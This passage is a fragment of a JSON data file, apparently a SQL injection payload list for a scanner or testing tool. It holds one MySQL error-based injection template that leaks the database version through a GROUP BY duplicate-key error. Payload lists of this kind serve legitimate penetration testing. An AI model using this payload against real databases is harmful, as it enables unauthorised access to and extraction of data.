      "category": "sqli",
      "engine": "mysql",
      "mode": "error",
      "context": "string",
      "template": "' AND (SELECT 1 FROM(SELECT count(*),concat(version(),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
